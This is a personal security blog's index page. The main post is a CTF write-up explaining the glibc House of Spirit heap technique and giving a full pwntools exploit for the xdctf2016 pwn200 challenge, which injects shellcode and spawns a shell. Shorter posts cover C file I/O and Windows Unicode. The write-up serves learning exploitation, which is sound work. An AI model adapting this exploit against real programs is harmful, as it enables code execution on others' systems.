<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Notwolf&#39;s Blog</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Notwolf&#39;s Blog">
<meta property="og:url" content="http://notwo1f.github.io/index.html">
<meta property="og:site_name" content="Notwolf&#39;s Blog">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Notwolf&#39;s Blog">
  
    <link rel="alternative" href="/atom.xml" title="Notwolf&#39;s Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="https://ovni67v5o.bkt.clouddn.com/blog/180310/44ckhLemj4.png">
  
  <link rel="stylesheet" href="/css/style.css">
  
<script>
    (function(){
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
        }
        else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

  
<!-- Google Analytics -->
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-85415703-1', 'auto');
  ga('send', 'pageview');

</script>
<!-- End Google Analytics -->


  <script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
  <script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>

  
</head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="http://ovni67v5o.bkt.clouddn.com/d27bebb818a83d2a26074c07b578db7c.jpg" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/">Notwolf</a></h1>
		</hgroup>

		
		<p class="header-subtitle">如果可以，什么时候都不晚</p>
		

		
			<div class="switch-btn">
				<div class="icon">
					<div class="icon-ctn">
						<div class="icon-wrap icon-house" data-idx="0">
							<div class="birdhouse"></div>
							<div class="birdhouse_holes"></div>
						</div>
						<div class="icon-wrap icon-ribbon hide" data-idx="1">
							<div class="ribbon"></div>
						</div>
						
						<div class="icon-wrap icon-link hide" data-idx="2">
							<div class="loopback_l"></div>
							<div class="loopback_r"></div>
						</div>
						
						
						<div class="icon-wrap icon-me hide" data-idx="3">
							<div class="user"></div>
							<div class="shoulder"></div>
						</div>
						
					</div>
					
				</div>
				<div class="tips-box hide">
					<div class="tips-arrow"></div>
					<ul class="tips-inner">
						<li>菜单</li>
						<li>标签</li>
						
						<li>友情链接</li>
						
						
						<li>关于我</li>
						
					</ul>
				</div>
			</div>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">主页</a></li>
				        
							<li><a href="/archives">所有文章</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
								<a class="github" target="_blank" href="https://github.com/notwo1f" title="github">github</a>
					        
								<a class="mail" target="_blank" href="/notwolf888@gmail.com" title="mail">mail</a>
					        
						</div>
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://f1sh.site">f1sh</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://iruby.me/">dimo</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://feiyyx.cc/">feiyyx</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.k0rz3n.com/">k0rz3n</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.pupiles.com/">pupiles</a>
			        
			        </div>
				</section>
				

				
				
				<section class="switch-part switch-part4">
				
					<div id="js-aboutme">Link knowledge with technology and Follow my heart</div>
				</section>
				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide">Notwolf</h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="http://ovni67v5o.bkt.clouddn.com/d27bebb818a83d2a26074c07b578db7c.jpg" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author">Notwolf</h1>
			</hgroup>
			
			<p class="header-subtitle">如果可以，什么时候都不晚</p>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">主页</a></li>
		        
					<li><a href="/archives">所有文章</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
						<a class="github" target="_blank" href="https://github.com/notwo1f" title="github">github</a>
			        
						<a class="mail" target="_blank" href="/notwolf888@gmail.com" title="mail">mail</a>
			        
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap">
  
    <article id="post-HouseofSprit-原理调试验证与实践" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/08/02/HouseofSprit-原理调试验证与实践/" class="article-date">
  	<time datetime="2018-08-02T11:45:26.000Z" itemprop="datePublished">2018-08-02</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/08/02/HouseofSprit-原理调试验证与实践/">
        HouseofSprit 原理调试验证与实践
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>由于在一个群无意抢了一个运气王红包，必须得发文章到i春秋论坛，所以水了这篇</p>
<h2 id="原理与调试验证"><a href="#原理与调试验证" class="headerlink" title="原理与调试验证"></a>原理与调试验证</h2><p>House of Spirit和其他的堆的利用手段有所不同。它是将<strong>存在的指针改写指向我们伪造的块（这个块可以位于堆、栈、bss任何一个位置）并且free掉欺骗glibc达到把伪造块回收到bins中不过在free之前，需要设置当前伪造块和下一个伪造块的size字段，满足free()的安全检测机制</strong>，从而欺骗glibc。<br>下面是heap exploitation 中的demo小程序先感性的体会下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">struct fast_chunk</span><br><span class="line">&#123;</span><br><span class="line">size_t pre_size;</span><br><span class="line">size_t size;</span><br><span class="line">struct fast_chunk *fd;</span><br><span class="line">struct fast_chunk *bk;</span><br><span class="line">char buf[0x20];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">struct fast_chunk fake_chunks[2];</span><br><span class="line">void *ptr,*victim;</span><br><span class="line">ptr=malloc(0x30);</span><br><span class="line">fake_chunks[0].size=sizeof(struct fast_chunk);</span><br><span class="line">fake_chunks[1].size=sizeof(struct fast_chunk);</span><br><span class="line">ptr=(void *)&amp;fake_chunks[0].fd;</span><br><span class="line">free(ptr);</span><br><span class="line">victim=malloc(0x30);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="调试验证"><a href="#调试验证" class="headerlink" title="调试验证"></a>调试验证</h3><p>申请两块fake_chunk。<br><img src="http://ovni67v5o.bkt.clouddn.com/TIM截图20180730194809.png" alt=""><br><img src="http://ovni67v5o.bkt.clouddn.com/TIM截图20180730195114.png" alt=""></p>
<p>所以:</p>
<p>&amp;fake_chunks[0]=0x7fffffffdda0<br>&amp;fake_chunks[1]=0x7fffffffdde0</p>
<p>为绕过安全监测机制，设置好当前块和下一块的size字段<br><img src="http://ovni67v5o.bkt.clouddn.com/TIM截图20180730195324.png" alt=""><br><img src="http://ovni67v5o.bkt.clouddn.com/TIM截图20180730195445.png" alt=""></p>
<p>改写一个指针指向<strong>伪造的块</strong><br><img src="http://ovni67v5o.bkt.clouddn.com/TIM截图20180730195606.png" alt=""><br><img src="http://ovni67v5o.bkt.clouddn.com/TIM截图20180730195658.png" alt=""></p>
<p>因为是fd的地址，所以是：0x7fffffffddb0</p>
<p><strong>free之后,伪造的块已经加入到了fastbin的链表中去了</strong></p>
<p><img src="http://ovni67v5o.bkt.clouddn.com/TIM截图20180730195847.png" alt=""><br><strong>此时再申请和伪造的块大小一样的块</strong><br><img src="http://ovni67v5o.bkt.clouddn.com/TIM截图20180730200221.png" alt=""><br>返回了和之前free的伪造块一样的块。<br>至于地址为什么是&amp;fake_chunks[0]+0x10是因为返回的可用memory就是位于pre_size和size字段之后。这个和chunk的结构有关</p>
<h2 id="为什么当前构造块和下一个构造块要填充size字段？"><a href="#为什么当前构造块和下一个构造块要填充size字段？" class="headerlink" title="为什么当前构造块和下一个构造块要填充size字段？"></a>为什么当前构造块和下一个构造块要填充size字段？</h2><p>分析下free的源码就知道了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">void </span><br><span class="line">public_fRE(Void_t* mem)</span><br><span class="line">&#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    mchunkptr p; // mem相应的chunk</span><br><span class="line">    ...</span><br><span class="line">    p = mem2chunk(mem);    //将 mem转换为chunk地址</span><br><span class="line">    if (chunk_is_mmapped(p))   //检查chunk的mmp位</span><br><span class="line">    &#123;</span><br><span class="line">        munmap_chunk(p);       //用unmmap的方式直接取消映射</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    ar_ptr = arena_for_chunk(p);  //找到chunk对应的area</span><br><span class="line">    ...</span><br><span class="line">    _int_free(ar_ptr, mem);       //调用init_free（）函数进入正常的free块并检测以及回收的流程</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为了让伪造的块进入到正常的free流程，所以要使得构造的当前chunk的size字段的mmp对应位是0就行了。</p>
<p>接下来是_init_free函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">void _int_free(mstate av, Void_t* mem)</span><br><span class="line">&#123;</span><br><span class="line">    mchunkptr p; // mem相应的chunk</span><br><span class="line">    INTERNAL_SIZE_T size; //size，大小</span><br><span class="line">    mfastbinptr* fb; //联系fast bin</span><br><span class="line">    ...</span><br><span class="line">    p = mem2chunk(mem);   //memory转换为chunk</span><br><span class="line">    size = chunksize(p);   //获得chunksize</span><br><span class="line">    ...</span><br><span class="line">    if ((unsigned long)(size) &lt;= (unsigned long)(av-&gt;max_fast))    //当前chunk的size字段的比较，不能超过fastbin的最大值</span><br><span class="line">    &#123;</span><br><span class="line">        if (chunk_at_offset(p, size)-&gt;size &lt;= 2 * SIZE_SZ</span><br><span class="line">            || __builtin_expect(chunksize(chunk_at_offset(p, size))</span><br><span class="line">                                            &gt;= av-&gt;system_mem, 0))            //比较下一个chunk的size字段，2*SIZE_ZE&lt;chunksize&lt;av-&gt;system_mem</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line">            errstr = &quot;free(): invalid next size (fast)&quot;;</span><br><span class="line">            goto errout;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">        fb = &amp;(av-&gt;fastbins[fastbin_index(size)]);</span><br><span class="line">        ...</span><br><span class="line">        p-&gt;fd = *fb;</span><br><span class="line">        *fb = p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以要设置好下个chunk的size字段。</p>
<p>原理懂了就找题练练手吧</p>
<h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><p>在网上找题练，找来找去，发现有篇一个比赛的wp说xdctf2016的时候，师傅们就出了这样的类似一道题，所以找Klaus师傅要了程序副本，调了下这题<br>pwn200：<br>虽然存在非预期的解法，这里不管，只是为了学习HouseOfSpirit。</p>
<h3 id="先分析流程："><a href="#先分析流程：" class="headerlink" title="先分析流程："></a>先分析流程：</h3><p>看看保护措施：<br>[upl-image-preview url=//bbs.xdsec.org/assets/files/2018-08-02/1533203221-307788-tim20180802174640.png]</p>
<p><img src="http://ovni67v5o.bkt.clouddn.com/TIM截图20180802144044.png" alt=""></p>
<p><strong>存在offbyone，只要完整的输入48个字节，就会泄露出ebp的值</strong>,结合保护措施，因此是可以使用shellcode的，至于怎么触发shellcode，肯定需要使程序控制流跳转到shellcode，这道题要么覆盖返回地址，要么修改free的got表。修改返回地址也有两种方式，一是直接栈溢出覆盖（这里肯定不行，输入长度有限制），二是通过Hos修改。这里只为学习Hos的利用，其他方法的请自行google学习<br>执行测试就知道：<br><img src="http://ovni67v5o.bkt.clouddn.com/TIM截图20180802144911.png" alt=""></p>
<p>划线的就是泄露的ebp的值。<br><img src="http://ovni67v5o.bkt.clouddn.com/TIM截图20180802145157.png" alt=""><br>输入id的值。<br>然后进入：<br><img src="http://ovni67v5o.bkt.clouddn.com/TIM截图20180802145319.png" alt=""><br>申请了一个块，然后先<strong>通过buff</strong>获得输入，然后再通过strcpy复制到申请的块当中，并将块的地址赋值到全局变量的指针<strong>ptr</strong>中去，<strong>并且这个ptr是可以被覆盖重写的</strong>。</p>
<p>然后进入：<br><img src="http://ovni67v5o.bkt.clouddn.com/TIM截图20180802145517.png" alt=""><br>这个函数的内容和经典的菜单题没什么区别。<br><img src="http://ovni67v5o.bkt.clouddn.com/TIM截图20180802145634.png" alt=""><br>checkout函数是把块给free掉<br><img src="http://ovni67v5o.bkt.clouddn.com/TIM截图20180802145714.png" alt=""><br>checkin则是<strong>申请块，并填充块的内容</strong>：<br>[upl-image-preview url=//bbs.xdsec.org/assets/files/2018-08-02/1533203388-23135-tim20180802174931.png]<br>仔细调试分析可以发现,在提示输入who are u？的函数里边，id是我们可以控制的，然后进入了函数<strong>400A29</strong><br>然后分配了money局部变量，也是我们可控的，stack的图大致如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">=============stack===================low</span><br><span class="line"></span><br><span class="line">          money</span><br><span class="line">          ...</span><br><span class="line">          返回地址</span><br><span class="line">          ...</span><br><span class="line">          id</span><br><span class="line">=====================================high</span><br></pre></td></tr></table></figure>
<p>money和id都是可控的。就返回地址不可控，再结和文章开始houseofspirit的使用条件是两个可控的chunk。<br>那其实这道题是HouseOfSpirit,已经很明显了。</p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ul>
<li><p><strong>从程序流程开始，先在栈中布置shellcode，并泄露出ebp的值，从而计算出shellcode在栈中的地址。</strong></p>
</li>
<li><p><strong>输入id作为下一个chunk的size字段的id的值</strong></p>
</li>
<li><p><strong>将局部分量money伪造成一个chunk,构造好大小并且使得大小把返回地址包括在内，把ptr的值溢出覆盖为构造的chunk的地址，这个地址可以通过泄露的ebp计算出来</strong></p>
</li>
<li><p><strong>free掉伪造的chunk</strong></p>
</li>
<li><p><strong>重新申请大小和伪造的chunk一致的块，使得系统将伪造的chunk分配给我们</strong></p>
</li>
<li><p><strong>申请回来之后，返回地址就是我们可控的了，再将shellcode的地址写入返回地址处，控制程序返回就可以getshell</strong></p>
</li>
</ul>
<h3 id="栈中布置图"><a href="#栈中布置图" class="headerlink" title="栈中布置图"></a>栈中布置图</h3><p>在本地调试时，获得了关键的变量的地址，然后自己拼了这个图（当时stack的布局）：<br><img src="http://ovni67v5o.bkt.clouddn.com/TIM截图20180802152034.png" alt=""></p>
<p>调试关键：<br><strong>0x400ac7</strong>处打断点，查看泄露ebp以及shellcode布置相关<br><strong>0x400b26</strong>处打断点，查看id在栈中的位置<br><strong>0x400a5f</strong>处打断点，伪造chunk</p>
<h3 id="exp及源文件"><a href="#exp及源文件" class="headerlink" title="exp及源文件:"></a>exp及源文件:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&quot;debug&quot;</span><br><span class="line">context.arch=&quot;amd64&quot;</span><br><span class="line">context.os=&quot;linux&quot;</span><br><span class="line">context.endian=&quot;little&quot;</span><br><span class="line">log.info( &quot;====start====&quot;)</span><br><span class="line">p=process(&quot;./pwn200&quot;)</span><br><span class="line">p.recvuntil(&quot;?\n&quot;)</span><br><span class="line">shellcode=asm(shellcraft.amd64.linux.sh())</span><br><span class="line">payload1=shellcode+(48-len(shellcode))*&quot;a&quot;</span><br><span class="line">#payload1=&quot;a&quot;*48</span><br><span class="line">log.info(&quot;====leaking the ebp===&quot;)</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recvuntil(payload1)</span><br><span class="line">ebp=u64(p.recv(6)+&apos;\0\0&apos;)</span><br><span class="line">shellcode_addr=ebp-0x50</span><br><span class="line">mem_addr=ebp-0x90</span><br><span class="line">print &quot;shellcode_addr:&quot;+hex(shellcode_addr)</span><br><span class="line">print &quot;mem_addr:&quot;+hex(mem_addr)</span><br><span class="line">log.info(&quot;====construct the fake chunk====&quot;)</span><br><span class="line">p.recvuntil(&quot;?\n&quot;)</span><br><span class="line">next_chunk_size=0x20</span><br><span class="line">p.send(str(next_chunk_size)+&apos;\n&apos;)</span><br><span class="line">padding=p64(0)*4</span><br><span class="line">chunk_presize=p64(0x1)</span><br><span class="line">chunk_size=p64(0x41)</span><br><span class="line">ptr=p64(mem_addr)</span><br><span class="line">payload=padding+chunk_presize+chunk_size+p64(0)+ptr</span><br><span class="line">p.recvuntil(&quot;~\n&quot;)</span><br><span class="line">p.send(payload+(0x40-len(payload))*&quot;\0&quot;)</span><br><span class="line">p.recvuntil(&quot;: &quot;)</span><br><span class="line">p.send(&quot;2\n&quot;)</span><br><span class="line">p.recvuntil(&quot;: &quot;)</span><br><span class="line">p.send(&quot;1\n&quot;)</span><br><span class="line">p.recvuntil(&quot;long?\n&quot;)</span><br><span class="line">p.send(&quot;48\n&quot;)</span><br><span class="line">p.recvuntil(&quot;money : &quot;)</span><br><span class="line">log.info(&quot;write the ret address to shellcode&quot;)</span><br><span class="line">payload2=&quot;1&quot;*0x18+p64(shellcode_addr)</span><br><span class="line">p.send(payload2)</span><br><span class="line">log.info(&quot;===get the shell===&quot;)</span><br><span class="line">p.recvuntil(&quot;: &quot;)</span><br><span class="line">p.send(&quot;3\n&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-c语言fread-fwrite-fseek" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/05/04/c语言fread-fwrite-fseek/" class="article-date">
  	<time datetime="2018-05-04T07:52:09.000Z" itemprop="datePublished">2018-05-04</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/05/04/c语言fread-fwrite-fseek/">
        c语言fread()fwrite()fseek()
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>好久没用c语言的这部分的东西了，今天看到一个练习是:<strong>将notepad.exe读取到内存中，然后将这片内存中的内容写入到一个空二进制文件中，看新生成的二进制文件是否可执行</strong></p>
<p>不做这个练习，凭自己大一瞎搞过来的经验也知道，是可以执行的，可是实际做的时候居然不行，是因为对C语言文件操作部分不熟，被坑了好久。。。唉</p>
<p>涉及到几个函数的使用：fclose()、fopen()、fread()、fwrite()、fseek()</p>
<h3 id="fopen"><a href="#fopen" class="headerlink" title="fopen()"></a>fopen()</h3><p>fopen()是文件打开函数，返回可以访问文件内容的<em>文件指针</em></p>
<p>使用格式：</p>
<blockquote>
<p>fopen(“filename”,”mode”);</p>
</blockquote>
<p><strong>filename</strong>为要打开的路径<br><strong>mode</strong>为：<strong>w(写)、r(读)、a(追加)</strong>以及配合他们使用的<strong>b（二进制方式）</strong><br>不使用带b后缀的打开模式时，使用<strong>文本模式</strong></p>
<h3 id="fclose"><a href="#fclose" class="headerlink" title="fclose()"></a>fclose()</h3><p>fclose()用于断开系统与打开的文件的指针的之间的联系，可以<strong>使得还在缓冲区中的数据保存到文件中</strong><br>使用格式： fclose(FILE *fp)</p>
<h3 id="fread"><a href="#fread" class="headerlink" title="fread()"></a>fread()</h3><p>从文件流中读数据，最多读取count个项，每个项size个字节，如果调用成功返回实际读取到的项个数（小于或等于count），如果不成功或读到文件末尾返回0</p>
<p>原型：</p>
<blockquote>
<p>size_t fread ( void _buffer, size_t size, size_t count, FILE_ stream) ;</p>
</blockquote>
<p>参数：</p>
<p>参 数</p>
<blockquote>
<p>buffer 用于接收数据的内存地址</p>
<p>size 要读的每个数据项的字节数，单位是字节</p>
<p>count 要读count个数据项，每个数据项size个字节.</p>
<p>stream 输入流</p>
<p>返回值 返回真实读取的项数，若大于count则意味着产生了错误。另外，产生错误后，文件位置指示器是无法确定的。若其他stream或buffer为空指针，或在unicode模式中写入的字节数为奇数，此函数设置errno为EINVAL以及返回0.</p>
</blockquote>
<h3 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite()"></a><a href="#fwrite" title="fwrite()"></a>fwrite()</h3><p>向指定的文件中写入若干数据块，如成功执行则返回实际写入的数据块数目。该函数以二进制形式对文件进行操作，不局限于文本文件</p>
<p>原型：</p>
<blockquote>
<p>size_t fwrite(const void _buffer, size_t size, size_t count, FILE_ stream);</p>
</blockquote>
<p>参数：</p>
<p>（1）buffer：是一个指针，对fwrite来说，是要获取数据的地址；</p>
<p>（2）size：要写入内容的单字节数；</p>
<p>（3）count:要进行写入size字节的数据项的个数；</p>
<p>（4）stream:目标文件指针；</p>
<p>（5）返回实际写入的数据项个数count。</p>
<h3 id="fseek"><a href="#fseek" class="headerlink" title="fseek()"></a><a href="#fseek" title="fseek()"></a>fseek()</h3><p>执行成功的话，stream将指向以fromwhere为基准，偏移offset（指针偏移量）个字节的位置，函数返回0。如果执行失败(比如offset超过文件自身大小)，则不改变stream指向的位置，函数返回一个非0值。</p>
<p>原型：</p>
<blockquote>
<p>int fseek(FILE *stream, long offset, int fromwhere);</p>
</blockquote>
<p>函数设置文件指针stream的位置。如果执行成功，stream将指向以fromwhere（偏移起始位置：文件头0(SEEK_SET)，当前位置1(SEEK_CUR)，文件尾2(SEEK_END)）为基准，偏移offset（指针偏移量）个字节的位置。如果执行失败(比如offset超过文件自身大小)，则不改变stream指向的位置。</p>
<p>下面是我的实现代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#define _CRT_SECURE_NO_WARNINGS</span><br><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	int length;</span><br><span class="line"></span><br><span class="line">	FILE * fp = fopen(argv[1], &quot;rb&quot;);   //可读模式打开文件</span><br><span class="line"></span><br><span class="line">	fseek(fp, 0, SEEK_END);   //将文件指针弄到文件位</span><br><span class="line"></span><br><span class="line">	length = ftell(fp);   //将文件的长度返回给length</span><br><span class="line"></span><br><span class="line">	fseek(fp, 0, SEEK_SET);</span><br><span class="line"></span><br><span class="line">	char * text = (char *) malloc(length*sizeof(char));</span><br><span class="line"></span><br><span class="line">	fread(text, sizeof(char), length, fp);</span><br><span class="line"></span><br><span class="line">	fseek(fp, 0, SEEK_SET);</span><br><span class="line"></span><br><span class="line">	FILE  *op = fopen(argv[2], &quot;wb&quot;);</span><br><span class="line"></span><br><span class="line">	fwrite(text, sizeof(char), length,op);    //将加载到内存中的文件写入到一个二进制文件中</span><br><span class="line"></span><br><span class="line">	fclose(fp);</span><br><span class="line"></span><br><span class="line">	fclose(op);</span><br><span class="line"></span><br><span class="line">	free(text);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-windows程序开发中Unicode和多字符" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/05/04/windows程序开发中Unicode和多字符/" class="article-date">
  	<time datetime="2018-05-04T07:46:10.000Z" itemprop="datePublished">2018-05-04</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/05/04/windows程序开发中Unicode和多字符/">
        windows程序开发中Unicode和多字符
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>windows程序开发中的Unicode和多字符</p>
<h3 id="Ascii码与多字符"><a href="#Ascii码与多字符" class="headerlink" title="Ascii码与多字符"></a><a href="#Ascii码与多字符" title="Ascii码与多字符"></a>Ascii码与多字符</h3><p>早期c语言使用的是Ascii码，也就是<strong>一个字节表示一个字符</strong>，8位可以表示256个不同的信息，所以可以表示256个字符，因扩展不同，ascii有几个版本，但是一个字节并不能表示很多其他的一些字符，所以使用了<strong>多字符集</strong>，也就是原本是ascii码的继续使用一个字节去表示，其他各个国家的语言文字及符号<strong>使用两个字节表示</strong></p>
<p>例如下面的这个程序：</p>
